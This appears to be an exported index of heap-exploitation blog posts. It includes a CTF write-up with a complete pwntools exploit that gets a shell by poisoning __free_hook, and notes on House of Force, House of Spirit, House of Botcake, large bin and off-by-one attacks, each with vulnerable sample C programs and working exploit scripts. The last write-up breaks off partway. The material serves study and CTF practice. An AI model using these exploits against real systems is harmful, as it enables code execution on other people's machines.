*(uint64_t*)((char*)fsbase + 0x28);     setup();     while (true) {         menu();         switch (get_int())         {             case 1: { add_note(); continue; }             case 2: { delete_note(); continue; }             case 3: { show_note(); continue; }             case 4: { edit_note(); continue; }             case 5:{  break; break;}         }            puts(\"Invalid\");     }     exit(0);     /* no return */ }   main() shows use the menu prompt. we can just move on to the first option add_note().  int64_t add_note() {     void* fsbase;     int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);     printf(\"Index (0-%d): \", 9);     int32_t index = get_int();     if (index &lt; 0 || index &gt; 9)         puts(\"Invalid index.\");     else if (!*(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;notes))     {         printf(\"Size: \");         int32_t size = get_int(); \t         if (size &lt;= 0 || size &gt; 0x1000)             puts(\"Invalid size.\");         else         {             *(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;notes) = malloc((int64_t)size);             *(uint32_t*)(((int64_t)index &lt;&lt; 2) + &amp;note_sizes) = size;             printf(\"Content: \");             read(0, *(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;notes), (int64_t)(size - 1));             puts(\"Note added.\");         }     }     else         puts(\"Note already exists.\");          int64_t result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);          if (!result)         return result;          __stack_chk_fail();     /* no return */ }   This function just asks for a index which should not be used, size between 0 and 0x1000 to allocate a chunk and data.  delete_note()  int64_t delete_note() {     void* fsbase;     int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);     printf(\"Index: \");     int32_t index = get_int();          if (index &lt; 0 || index &gt; 9 || !*(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;notes))         puts(\"Invalid index or empty.\");     else     {         free(*(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;notes));         puts(\"Note deleted.\");     }          int64_t result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);          if (!result)         return result;          __stack_chk_fail();     /* no return */ }    This function asks for  a index and then it frees the chunk but is does not clear out the function pointer, therefore the is a use-after-free vulnerability here.  show_note()  int64_t show_note() {     void* fsbase;     int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);     printf(\"Index: \");     int32_t index = get_int();          if (index &lt; 0 || index &gt; 9 || !*(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;notes))         puts(\"Invalid index or empty.\");     else     {         printf(\"Data: \");         write(1, *(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;notes),              (int64_t)*(uint32_t*)(((int64_t)index &lt;&lt; 2) + &amp;note_sizes));         puts(&amp;data_402097);     }          int64_t result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);          if (!result)         return result;          __stack_chk_fail();     /* no return */ }   As the function name says it just prints out the contents of the chunk.  edit_note()  int64_t edit_note() {     void* fsbase;     int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);     printf(\"Index: \");     int32_t index = get_int();          if (index &lt; 0 || index &gt; 9 || !*(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;notes))         puts(\"Invalid index or empty.\");     else     {         printf(\"New Content: \");         read(0, *(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;notes),              (int64_t)*(uint32_t*)(((int64_t)index &lt;&lt; 2) + &amp;note_sizes));         puts(\"Note updated.\");     }          int64_t result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);          if (!result)         return result;          __stack_chk_fail();     /* no return */ }   This function Overwrites the contents of an existing note.  Exploitation  Strategy: The goal is to gain arbitrary code execution.     Stage 1: Libc leak            Use the unsorted bin attack to leak a libc address and then calculate the base address.           Stage 2: Tcache poisoning and hook hijacking.            Use the tcache poisoning technique to hijack the __free_hook and get code execution.           I create a template class to help make it easier to write the exploit   def print_leak(description, addr): \tlog.info(f\"{description} @ {addr}\")  class GhostNote: \tdef __init__(self): \t\tpass  \tdef menu(self, choice): \t\tsla(b\"&gt; \", str(choice).encode())  \tdef send_index(self, index): \t\tsla(b\"Index: \", str(index).encode())  \tdef add_note(self, index:int, size:int, note:bytes): \t\tself.menu(1) \t\tlog.info(f\"Adding Note | index {index} | {note[:8]}\") \t\tsla(b\"(0-9): \", str(index).encode()) \t\tsla(b\"Size: \", str(size).encode()) \t\tsla(b\"Content: \", note) \t\trl()  \tdef delete_note(self, index): \t\tlog.info(f\"Delete Note | index {index}\") \t\tself.menu(2) \t\tself.send_index(index) \t\trl()  \tdef edit_note(self, index, note): \t\tlog.info(f\"Edit Note | index {index} | {note[:8]}\") \t\tself.menu(4) \t\tself.send_index(index) \t\tsa(b\"New Content: \", note) \t\t#ru(b\"New Content: \") \t\t#s(note)  \tdef show_note(self, index): \t\tlog.failure(f\"Show Note | index {index}\") \t\tself.menu(3) \t\tsla(b\"Index: \", str(index).encode()) \t\tru(b\"Data: \") \t\tdata = rl().rstrip(b\"\\r\\n\") \t\ttry:  \t\t\tdata = data[:8] \t\t\tleak = u64(data.ljust(8, b\"\\x00\")) \t\t\tprint_leak(\"Leak\", leak) \t\t\treturn leak \t\texcept: \t\t\tlog.info(f\"Data: {data}\") \t\t\treturn 0   gn is the object of the this class  Stage 1: Libc Address Leak  Allocate the chunks.  gn.add_note(8, 0x600, b\"A\"0xf) # large size so it goes to unsorted bin gn.add_note(9, 0x10, b\"/bin/sh\\x00\") # to prevent consoliddation | will be used later on again   leak = gn.show_note(8) # this will leak the libc address    Trigger the unsorted bin: free the large chunk  gn.delete_note(8)# it goes to unsorted bin   Leak the address  leak = gn.show_note(8) # this will leak the libc address   Calculate the libc base address  libc.address = leak - 0x1ecbe0   Stage 2: Tcache Poisoning and Hook Hijacking  Allocate and free two small chunks of the same size  gn.add_note(0, 0x60, b\"X\"*0x48) gn.add_note(1, 0x60, b\"Y\"*0x48)  gn.delete_note(0) gn.delete_note(1)   Use the UAF to corrupt the next/fd pointer on the second freed chunks. Set it to __free_hook  gn.edit_note(1, p64(libc.sym.__free_hook))   Allocate to new chunks of the same size as the one that are free. The first chunk returns a chunk from the tcache and the second one returns the __free_hook. Overwrite the __free_hook chunk with the address of the system()  gn.add_note(2, 0x60, b\"B\"*0x48) gn.add_note(3, 0x60, p64(libc.sym.system))   Trigger shell. Free the chunk that contains the string /bin/sh. Remember that the guard chunk we allocated ealier contains that string.  gn.delete_note(9)   That pops a shell    The full exploit  class GhostNote: \tdef __init__(self): \t\tpass  \tdef menu(self, choice): \t\tsla(b\"&gt; \", str(choice).encode())  \tdef send_index(self, index): \t\tsla(b\"Index: \", str(index).encode())  \tdef add_note(self, index:int, size:int, note:bytes): \t\tself.menu(1) \t\tlog.info(f\"Adding Note | index {index} | {note[:8]}\") \t\tsla(b\"(0-9): \", str(index).encode()) \t\tsla(b\"Size: \", str(size).encode()) \t\tsla(b\"Content: \", note) \t\trl()  \tdef delete_note(self, index): \t\tlog.info(f\"Delete Note | index {index}\") \t\tself.menu(2) \t\tself.send_index(index) \t\trl()  \tdef edit_note(self, index, note): \t\tlog.info(f\"Edit Note | index {index} | {note[:8]}\") \t\tself.menu(4) \t\tself.send_index(index) \t\tsa(b\"New Content: \", note) \t\t#ru(b\"New Content: \") \t\t#s(note)  \tdef show_note(self, index): \t\tlog.failure(f\"Show Note | index {index}\") \t\tself.menu(3) \t\t#self.send_index(3) \t\tsla(b\"Index: \", str(index).encode()) \t\tru(b\"Data: \") \t\tdata = rl().rstrip(b\"\\r\\n\") \t\t#print(data[:8]) \t\ttry:  \t\t\tdata = data[:8] \t\t\tleak = u64(data.ljust(8, b\"\\x00\")) \t\t\tprint_leak(\"Leak\", leak) \t\t\treturn leak \t\texcept: \t\t\tlog.info(f\"Data: {data}\") \t\t\treturn 0 \t\t\t def exploit(): \t#####################################################################  \t######################## EXPLOIT CODE ############################### \t##################################################################### \tgn = GhostNote()  \t# leak | find libc base \tgn.add_note(8, 0x600, b\"A\"*0xf) \tgn.add_note(9, 0x10, b\"/bin/sh\\x00\") \tgn.delete_note(8) \tleak = gn.show_note(8) \tlibc.address = leak - 0x1ecbe0 \tone_gadget = 0xe3afe \tprint_leak(\"libc base\", libc.address) \tprint_leak(\"__free_hook\", libc.sym.__free_hook) \t \tgn.add_note(0, 0x60, b\"X\"*0x48) \tgn.add_note(1, 0x60, b\"Y\"*0x48)  \tgn.delete_note(0) \tgn.delete_note(1)  \tgn.edit_note(1, p64(libc.sym.__free_hook)) \tgn.add_note(2, 0x60, b\"B\"*0x48) # same as 1 \tgn.add_note(3, 0x60, p64(libc.sym.system)) \t \tgn.delete_note(9)   FULL EXPLOIT"
  },
  
  {
    "title": "Large Bin Attack",
    "url": "/post/large-bin-attack/",
    "categories": "Notes, heap-exploitation",
    "tags": "large-bin, heap",
    "date": "2025-11-15 00:00:00 +0200",
    "content": "Large bin attack.  This technique allows you to modify an arbitrary address with an value of a large bin chunk. This technique alone is not enough to get code execution, in modern GLIBC FSOP in needed to finish exploit, overwrite _IO_list_all to forge fake _IO_File structures and in older GLIBC you could overwrite global_max_fast and perform a fastbin poison/dup. Large bin summary:  This is the structure for large bins.  struct malloc_chunk {   INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk, if it is free. */   INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */     /* double links -- used only if this chunk is free. */   struct malloc_chunk* fd;                 struct malloc_chunk* bk;   /* Only used for large blocks: pointer to next larger size.  */   struct malloc_chunk* fd_nextsize;   struct malloc_chunk* bk_nextsize; }; typedef struct malloc_chunk* mchunkptr;   Large bins store chunks within a specific range and not of the same size. In order to speed up indexing and searching the fd_nextsize and bk_nextsize were introduced, these points are used to traverse chunks of the group size.  How does the attack work?  The attack happens in the process when a chunk is inserted into a large bin, which then is unlinked and pointers are changed in the relevant chunks.  The goal is to modify the bk_nextsize field of a chunk.  When GLIBC inserts a chunk into a large bin, it performs pointer updates. The goal is to hijack which pointers GLIBC updates, so that it writes an arbitrary address into a arbitrary memory location.  So why do we need to used chunks of different sizes?  When inserting a chunk into a large bin, glibc compares sizes:  if (size == chunksize_nomask(fwd))  \tfwd = fwd-&gt;fd; // insert second inlist, skip nextsize updates.   if the sizes are equal, GLIBC does not touch the nextsize pointers.  This attack targets the nextsize list, which is used when chunks are not of the same size but are still in the same large (within a certain range).  What actually happens during large bin insertion?  GLIBC &lt;= 2.29  There are two possible cases depending on size:    Inserted chunk is smaller            fwd-&gt;fd-&gt;bk_nextsize  = victim;           Inserted chunk is larger            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;           Either cases gives a write to one of the nextsize pointers.  GLIBC &gt;= 2.30  Everything changed, as a new integrity check was introduced to prevent the second case (inserted chunk is larger) from working.  Only this case works:     Inserted chunk is smaller than the smallest chunk            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;           This means GLIBC will write the address of the inserted chunk into bk_next_size + 0x20 because fd_nextsize is 0x20 bytes after the pointer to the chunk.  Exploitation Steps  Prerequisites     Allocate a large chunk.            Lets call it  chunkA           Allocate a chunk smaller than chunkA.      - Lets call it chunkB   Allocate a guard chunk to prevent consolidation.   Free chunkA.            chunkA will be placed in the unsorted bin.           Allocate a chunk larger than chunkA.            Lets call it chunkC       This is done so that chunkA is sorted into the large bin.           Free chunkB   Now modify chunkA            Modify chunkA-&gt;bk_nextsize to point to [target - 0x20]           Allocate a larger chunk than chunkB.            This is done so that chunkB can be sorted into large bin, then GLIBC will try to update the pointers which leads to overwriting the address chunkA-&gt;bk_nextsize-&gt;fd_nextsize with the address of chunkB           Now target == chunkB     Demo  Comming soon  Resources"
  },
  
  {
    "title": "House of Force",
    "url": "/post/house-of-force/",
    "categories": "Notes, heap-exploitation",
    "tags": "house-of-force",
    "date": "2025-11-12 00:00:00 +0200",
    "content": "House of Force  This is a older exploitation technique that works on glibc 2.27 and lower.  The goal of the house of force is to get malloc() to return a arbitrary value/address by overwriting the top chunk. So what is the top chunk?  The top chunk (also known as the wilderness) is a special chunk, it is last in memory (highest address) for the given heap arena. It is not part of any free bins and its primary purpose is to service memory allocates requests from malloc() when no other suitable free chunks are found in the available bins and it will be resized.  Why does it not work on modern glibc?  Requirements     &lt;= glibc 2.27   Heap overflow from a chunk adjacent to the top chunk   Control over the size of malloc()   A heap address leak so we know the relative offset to our write location.     Steps         Overwrite top chunk side field.            use a heap overflow to overwrite the size field of the top chunks.       Overwrite the size field with a big value so that we can ensure that malloc() will never call mmap:  0xffffffffffffff (64 bit)           Allocate a chunk that will get use right up against the desired location.            We must use a integer overflow.                                                       e.g. top_chunk = 0x603110               target = 0x602080                                                     use a integer overflow 0xffffffffffffef50 so that the top chunk is at target address.           target - top_chunk - ox20                           ##  Vulnerable sample program  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;   char target[0x20] = \"Nothing to see here\"; char *heapchunk;  void init() { \tsetbuf(stdin, NULL); \tsetbuf(stderr, NULL); \tsetbuf(stdout, NULL); }  int main() { \tinit(); \tvoid *ptr = malloc(8); \tprintf(\"Target @ %p\\nHeap @ %p\\n\", &amp;target, ptr - 0x10);  \tint size; \twhile (1) { \t\tprintf(\"Size: \"); \t\tscanf(\"%d\", &amp;size); \t\theapchunk = (char*)malloc(size); \t\tprintf(\"Data: \"); \t\tscanf(\"%s\", heapchunk);  \t\tprintf(\"Target : %s\\n\", target); \t}\t }   exploit   def malloc(size:int, data:bytes): \tsla(b\"Size: \", str(size).encode()) \tsla(b\"Data: \", data)  \tru(b\"Target : \") \tdata = rl().decode()  \tlog.info(f\"Target : {data}\")  def exploit(): \t#####################################################################  \t######################## EXPLOIT CODE ############################### \t##################################################################### \tru(b\"Target @ \") \ttarget_addr = int(rl(), 16) \tru(b\"Heap @ \") \theap = int(rl(), 16) \tprint_leak(\"Target\", target_addr) \tprint_leak(\"Heap\", heap)  \tsize = 256 \tpayload = flat( \t\tb\"A\"*size, \t\tsize, # prev size \t\t0xffffffffffffffff # size \t)  \tmalloc(size, payload) \tsize = target_addr - (heap + (0x18 + 256 + 0x10)) - 0x20 # `target - top_chunk - ox20` \tlog.info(\"Distance: \" + hex(size)) \tmalloc(size, b\"AAA\") \tsize = 0x100 \tmalloc(size, b\"PWNED|using_house_of_force\")  \tio.close()"
  },
  
  {
    "title": "Off-by-one overflow",
    "url": "/post/off-by-one/",
    "categories": "Notes, heap-exploitation",
    "tags": "off-by-one, poison-null-byte, off-by-null, heap-exploitation, pwn",
    "date": "2025-11-03 00:00:00 +0200",
    "content": "off-by-one vulnerability Programming mistakes that cause off-by-one  Incorrect Bounds Checking.  #include &lt;stdio.h&gt; #include &lt;string.h&gt; #define SIZE 1024 int main(void) {  \t \tchar *a = (char*)malloc(SIZE); \tif (!a) exit(0); \t \tfor (int i = 0; i &lt;= SIZE; i++) { \t\tchar c = fgetc(stdin); \t\tif (c == EOF) a[i] = '\\0'; \t\telse a[i] = c; \t} }   If i reaches SIZE, then the loop continues, but a[SIZE] is out of bounds. The valid index ranges from 0 to SIZE - 1. String Operations.  #include &lt;stdio.h&gt; #include &lt;string.h&gt; #define SIZE 1024 int main(int argc, char **argv) { \tif (argc == 2 &amp;&amp; strlen(argv[1] &gt; SIZE)) exit(0);  \t \tchar *chunk1 = malloc(SIZE); \tif (!chunk1) exit(0); \t \tif (strlen(argv[1] == SIZE)) \tstrcpy(chunk1, argv[1]); }   This is caused by the functionality of strlen() because when the function calculates the string length, it does not count \\x00, which then causes strcpy() to copy SIZE+1 bytes into the chunk1.  #include &lt;stdio.h&gt; #include &lt;string.h&gt; #define SIZE 1024 int main(int argc, char **argv) { \tif (argc == 2 &amp;&amp; strlen(argv[1] &gt; SIZE)) exit(0);  \t \tchar *a = malloc(SIZE); \tif (!a) exit(0); \tint bytesRead = read(0, a, SIZE); \ta[bytesRead] = '\\0'; }   Types of off-by-one  There are 2 types of off by one vulnerabilities:    Arbitrary byte: Allows to overwrite with any value.   Poison null byte (off-by-null): Allows to overwrite with only null byte (0x00).   Heap Review  In 64 bit systems, the memory is aligned with 16 bytes ( 8 bytes for 32 bit systems). For some other allocations whose size isn’t aligned with 16 bytes (e.g. 0x38) the last 8 bytes of a chunk will overlap with the  prev_size field of the next chunk, and because of this a off-by-one vulnerability can overwrite the size field.  Exploitation  Off-by-one / poison null bytes on the heap can lead to code execution by corrupting heap metadata, particularly the prev_inuse flag and the previous size field, to create overlapping chunks by forcing the malloc() to consolidate memory blocks incorrectly .So that we can change the contents of other chunks to then further use other heap exploitation techniques like tcache poisoning.  General off-by-one attack. (arbitrary byte)     Allocate 4 chunks.            Chunk A, B, and Cof any size.       Chunk D to prevent consolidation.           Free chunk C            It will go to one of the bins based on the size.           Use chunk A to overflow to the size field of chunk B            Modify the size field of chunk B and make sure the size overlaps with chunk C           Now chunk B will contain the free chunk C or its metadata.   Free chunk B and allocate the same size again.            Lets say chunk B was 0x20 and we modified it to be 0x40.                                                       Now free chunk B and allocate a chunk of size 0x40.               pass 0x30 to malloc()                                                   Now the fd/next pointer of chunk C can be modified or viewed.            Can modify the fd/next pointer to perform tcache poisoning or any other bin attack.       If chunk C is in unsorted bin, you can view the fd/bk and get libc leak.           General poison null byte.  The poison null byte is used to clear the prev_inuse flag for chunks that are greater than `0x100.  Here is why.    Lets say that we have a chunk of size 0x20.   when we try to clear the prev_inuse flag we will overwrite the size field from 0x21 to 0x00.   Now the chunk will have size 0x00 which is not a valid size field, and the   Chunk C is our target.  Steps     Allocate 4 chunks.            Chunk A’s size must not be aligned with 16 bytes and must be large enough to contain libc addresses (unsorted bin).       Chunk B is used to trigger the overflow.       Chunk C is our target.       Chunk D to prevent consolidation.           Corrupt metadata.            Free chunk A first to make it a valid free chunk.       Use off-by-null vulnerability in  chunk B to set a fake prev_size and clear the prev_inuse flag in chunk C.       Fake prev_size combined size of A + B e.g. Lets say the size of  chunk A = 0x40 and size of chunk B = 0x20, then set prev_size = 0x60.           Force Consolidation.            Free chunk C. because the prev_size field is set to fake size (A + B) and the prev_inuse flag is not set, libc will start the consolidation process.       A overlapping chunk will be created: All the chunks will be combined (A + B + C ) into a single large free chunk.       The large chunk now overlaps with chunk B, which is NOT free (currently in use).           Allocate new chunk.            Lets call it chunk E.       This chunk will be carved out from the large consolidated free chunk.       chunk E is allocated to adjust the fd and bk pointers.       The size must be the same as chunk A             how2heap     allocate a large padding.            so that the fake chunk’s addresses lowest 2nd byte is 0x00           allocate 3 chunks            chunk 3 to prevent consolidation.           link chunk 1 into largebin.            fd_nextsize and bk_nextsize = fd and bk of the fake chunk.       Allocate new chunk (a) with a little bit smaller size then chunk1, and then a small chunik to prevent cosolidation       allocate another new chunk (b) with a little bit larger size than chunk1 and a small chunk for colidation.       free chunk a, b, and then 1.       allocate a huge chunk to enable sorting. e.g. 0x1000       now a, b, and 1 will be in largebin.           allocate new chunk with size 1.   Double free  Requirements    Use-after-free.        Poison null byte.            Allocate chunk A and then free it.       Allocate chunk B of different size than chunk A then free it.       Allocate chunk C of the same size as chunk A.                 This will return the same chunk as chunk A       Use off-by-one to overwrite the prev_inuse flag of chunk B                    Free chunk B                       Now you have a double free.           You can now use double free for other attacks like tcache poisoning or fastbin dup.       Allocate 3 adjacent chunks. a, b, c            poison null byte at b           Allocate another chunk to prevent consolidation   Free c .            b  and a stays in use.           Set fake metadata in chunk a.            prev_size = 0       size = a + b - 0x10           use off-by-one metadata            Set prev_size of b  to a + b - 0x10       perform off-by-null byte to unset the prev_inuse in chunk b           free b            This will force backward consolidation A + B.      - Allocate overlapping chunks with of size A + B             Resources     https://devel0pment.de/?p=688   https://github.com/shinmao/WhyNot-HEAP-Exploitation/blob/master/Off-By-One/README.md   https://www.youtube.com/watch?v=nNObrLQZlMw"
  },
  
  {
    "title": "House of Spirit",
    "url": "/post/house-of-spirit/",
    "categories": "Notes, heap-exploitation",
    "tags": "pwn, house-of-spirit",
    "date": "2025-11-02 00:00:00 +0200",
    "content": "House of spirit attack allows us to get malloc to return a fake chunk to a region we have some control over (such as the bss or stack).  Goal  Add a attacker controlled buffer into the tcache/fastbin so it can be later allocated by malloc()  Obtain an arbitrary allocation primitive.  This technique requires a overflow or out of bounds write vulnerability in order to overwrite a pointer returned by malloc() before it is freed.  We can use this with tcache poisoning  to get code execution. Steps  Using Tcache     Prepare fake chunk   Overwrite a pointer returned by malloc() with the address of the fake chunk.   Free The fake chunk   The next call to malloc will return our fake chunk.     Using Fastbin      Fill in tcache   Prepare fake chunks            Create 2 fake chunks.                    The first chunk is where we want our chunk returned by malloc to be.                       Restrictions to meet                    Size of chunks should be within fastbin range (the 2 sizes do not have to be equal)           The size values must be placed where they should be if they were an actual chunk.           The size of the first heap chunk must be the same as the rounded up heap size of the malloc() that we we to allocate our fake chunk.                       is_mapped and non_main_arena bits should be unset.           Overwrite a pointer returned by malloc() with the address of the first fake chunk.   Then free the chunk.   Take out the fake chunk.            malloc() will return our fake chunk           ###    Overwriting a pointer returned by malloc() which will then be passed to free()            This can lead to the linking of an arbitrary address into a fastbin.           A further call to malloc() can result in this arbitrary address being using as a chunk of memory   Example  Vuln program  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;   char buf[0x50]; char *a;  int main() { \ta = malloc(0x20); \tprintf(\"buf: %p\\na is at: %p\\na points to: %p\\n\\n\", &amp;buf, &amp;a, a); \tprintf(\"username: \"); \tfgets(buf, 0x80, stdin);  \tfree(a); \t \tchar *victim = malloc(0x20);  \tprintf(\"enter username again: \"); \tfgets(buf, 0x50 - 1, stdin);  \tprintf(\"victim : %s\\n\", victim);  \treturn 0; }\t   exploit  def exploit(): \t#####################################################################  \t######################## EXPLOIT CODE ############################### \t##################################################################### \tru(b\"buf: \") \tbuf = int(rl(), 16) \tprint_leak(\"buf\", buf) \tru(b\"is at: \") \tchunk_a = int(rl(), 16) \tprint_leak(\"a is at\", chunk_a) \tru(b\"points to: \") \taddr = int(rl(), 16) \tprint_leak(\"a points to\", addr)  \tleng =  chunk_a - buf  \t# fake chunk \tpayload = flat( \t\t0x0, \t\t0x31, \t\tcyclic((leng-16)), \t\tbuf+16 \t) \tsla(b\"username: \", payload)  \tx = b\"A\"*16+b\"PWNED\" \t \tsla(b\"enter username again: \", x) \tru(b\"victim : \") \tdata = rl().decode() \tlog.info(f\"Victim Chunk : {data}\")   ./xpl.py  [*] '/usr/lib/x86_64-linux-gnu/libc.so.6'     Arch:     amd64-64-little     RELRO:    Partial RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled [*] Loaded 5 cached gadgets for './a.out' [+] Starting local process '/home/hacker/REPO/exploitation-practice/house-of-spirit/a.out': pid 39150 [*] buf @ 0x404060 [*] a is at @ 0x4040b0 [*] a points to @ 0x3fe7d2a0 [*] Process '/home/hacker/REPO/exploitation-practice/house-of-spirit/a.out' stopped with exit code 0 (pid 39150) [*] Victim Chunk : PWNED [*] Switching to interactive mode"
  },
  
  {
    "title": "House of Botcake",
    "url": "/post/house-of-botcake/",
    "categories": "Notes, heap-exploitation",
    "tags": "house-of-botcake, tcach-poisioning, tcache",
    "date": "2025-10-27 00:00:00 +0200",
    "content": "Steps     Allocate 10 chunks.            7 chunk to fill tcache bins       chunk 8 will be used later for later consolidation       chunk 9 is the victim chunk       chunk 10 is to prevent consolidation with top chunk for chunk 9.           Free Chunks            7 chunks to fill tcache bins       free chunk 9 so it be added into unsorted bin       free chunk 8 so that is consolidates with victim chunk (chunk 9).           Add victim chunk to tcache bins.            allocate 1 chunk to remove the 7th chunk from the tcache bins.                    his frees one slot in tcache for our victim chunk.                       free the chunk 9 (victim) again.                    Now we have double free, the victim chunk is in both the tcache and the unsorted bins                           Get a overlapping chunk.            allocate a new chunk with a size that ensures that the chunk overlaps to the victim chunk.           Overwrite fd/next pointer of chunk 9 (victim).            apply safe linking to target address..           2 final allocations            The first allocation will return the chunk 9 (victim)       The second allocation will return target address           After these steps you will get a overlapping chunk from the unsorted bin.  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;stdint.h&gt;  int main() { \t// STEP 1 \tchar target[0x20] = \"Nothing to see here\"; \tprintf(\"target @ %p\\ntarget: %s\\n\", &amp;target, target); \tchar *ptrs[7]; \tfor (int i = 0;i &lt; 7; i++){ \t\tptrs[i] = malloc(0x100); \t} \tchar *for_consolidation = malloc(0x100); \tchar *victim = malloc(0x100); \tchar *gap = malloc(0x10); \tprintf(\"consolidation_chunk @ %p\\nvictim @ %p\\n\", for_consolidation, victim);  \t// STEP 2 \tfor (int i = 0; i &lt; 7; i++) { \t\tfree(ptrs[i]); \t} \tfree(victim); \tfree(for_consolidation);  \t// STEP 3 \tchar *free_space = malloc(0x100); \tfree(victim);   \t// STEP 4   \tchar *overlapping_chunk = malloc(0x120);  \tprintf(\"overlapping chunk @ %p = consolidation_chunk @ %p\\n\", overlapping_chunk, for_consolidation); \t \t// STEP 5 \t \tuintptr_t stored  = ((long)victim &gt;&gt; 12) ^ (long)&amp;target;; \tmemcpy(overlapping_chunk+0x110, &amp;stored, sizeof(stored)); \t \t// STEP 6 \tchar *a = malloc(0x100);  \tchar *b = malloc(0x100);  \tprintf(\"a @ %p = victim @ %p \\n\", a, victim); \tprintf(\"b @ %p = target @ %p\\n\", b, &amp;target);   \tstrcpy(b, \"PWNED\"); \tprintf(\"target: %s\\n\", target); }   When we run it  ./a.out  target @ 0x7fffffffdeb0 target: Nothing to see here consolidation_chunk @ 0x405e20 victim @ 0x405f30 overlapping chunk @ 0x405e20 = consolidation_chunk @ 0x405e20 a @ 0x405f30 = victim @ 0x405f30  b @ 0x7fffffffdeb0 = target @ 0x7fffffffdeb0 target: PWNED"
  },
  
  {
    "title": "QNQSEC Debtor's Database Writeup",
    "url": "/post/qnqsec-debtors-database/",
    "categories": "writeup, pwn",
    "tags": "stack-canary, stack-overflow",
    "date": "2025-10-20 00:00:00 +0200",
    "content": "About The binary    The binary is dynamically linked, and has all security mitigations turned on. Reversing main  int main() { \tvoid* fsbase \tint64_t canary = *(fsbase + 0x28) \tsetup() \tputs(\"What is your name (9 chars or le…\") \tvoid name \tfgets(&amp;name, 0xa, stdin) \tprintf(\"Hello, \") \tprintf(&amp;name)  // &lt;-- format string \tputchar(0xa) \tfflush(stdin) \tmenu() \tnoreturn }   main() prompts user for a name the prints it using printf(name), which introduces a format string vulnerability. After that it calls menu()  menu  int main() { \tvoid* fsbase; \tint64_t var_10 = *(fsbase + 0x28);  \twhile (true); \t    putchar(0xa); \t    puts(\"Debtors' Database v2.1\"); \t    puts(\"What do you want to do today?\\n\"); \t    puts(\"1. Show namelist\"); \t    puts(\"2. Input name\"); \t    puts(\"3. Delete name\"); \t    puts(\"4. Admin menu\"); \t    printf(&amp;data_402263); \t    void input; \t    fgets(&amp;input, 4, stdin); \t    fflush(stdin); \t    putchar(0xa); \t    int32_t choice = atoi(&amp;input); \t \t    if (choice == 4) \t        break; \t \t    if (choice == 3) \t        remove_name(); \t        continue; \t    else if (choice == 1) \t        show_namelist(); \t        continue; \t    else if (choice == 2) \t        input_name(); \t        continue;  \t    puts(\"Invalid input!\"); \t    puts(\"Press ENTER to go back...\"); \t    getchar(); \tenter_password(); \texit(status: 0); \tnoreturn;    Simple menu lop that calls other functions. show_namelist  void show_namelist() { \tputs(\"[Index]        | [Amt]       | […\")  \tfor (int32_t i = 0; i s&lt;= 0x13; i += 1) \t    if (*((sx.q(i) &lt;&lt; 3) + &amp;namelist) == 0) \t        printf(\"Index #%d  | EMPTY\\n\", zx.q(i)) \t    else \t        printf(\"Index #%d  | $%d  | %s\\n\", zx.q(i),  \t            zx.q(*(*((sx.q(i) &lt;&lt; 3) + &amp;namelist) + 0x80)),  \t            *((sx.q(i) &lt;&lt; 3) + &amp;namelist))  \tputs(\"Press ENTER to return.\") \treturn getchar() }   This function is not really interesting. It shows 20 slots (0 - 19), and if the slot is empty it prints EMPTY, otherwise it prints  Index #i | $amount | name input_name  int64 input_name() { \tvoid* fsbase \tint64_t rax = *(fsbase + 0x28) \tputs(\"Adding a new entry.\") \tputs(\"Which index do you want to input…\") \tchar buf[0x80] \tfgets(&amp;buf, 4, stdin) \tint32_t index = atoi(&amp;buf) \tfflush(stdin)  \tif (index s&gt; 0x13 || index s&lt; 0) \t    puts(\"Invalid index!\") \t    puts(\"Press ENTER to go back...\") \t    getchar() \telse \t    puts(\"Enter debtor's name:\") \t    fgets(&amp;buf, 0x80, stdin) \t    buf[strcspn(&amp;buf, &amp;data_4020ef, &amp;data_4020ef)] = 0 \t    void debtors_name \t    // check for buffer overflow \t    strcpy(&amp;debtors_name, &amp;buf, &amp;buf) \t    fflush(stdin) \t    puts(\"Enter the amount owed:\") \t    fgets(&amp;buf, 0xa, stdin) \t    int32_t amount_owed = atoi(&amp;buf) \t    fflush(stdin) \t    *((sx.q(index) &lt;&lt; 3) + &amp;namelist) = malloc(0x84) \t    *(*((sx.q(index) &lt;&lt; 3) + &amp;namelist) + 0x80) = amount_owed \t    int64_t name = *((sx.q(index) &lt;&lt; 3) + &amp;namelist) \t    strcpy(name, &amp;debtors_name, name) \t    puts(\"Name inputted.\") \t    printf(\"%s owes %d, added to slot #%d.\\n\", *((sx.q(index) &lt;&lt; 3) + &amp;namelist),  \t        zx.q(*(*((sx.q(index) &lt;&lt; 3) + &amp;namelist) + 0x80)), zx.q(index)) \t    puts(\"Press ENTER to return.\") \t    getchar()  \tif (rax == *(fsbase + 0x28)) \t    return rax - *(fsbase + 0x28)  \t__stack_chk_fail() \tnoreturn }   This function implements a add entry operation. It reads an index from stdin (validates 0 - 19), then it prompts for debtor name and amount. The name is copied to a heap slot (0x84 bytes) and pointer is stored in the namelist array. remove_name  int64_t remove_name() { \tvoid* fsbase; \tint64_t rax = *(uint64_t*)((char*)fsbase + 0x28); \tputs(\"Which name would you like to rem…\"); \tvoid buf; 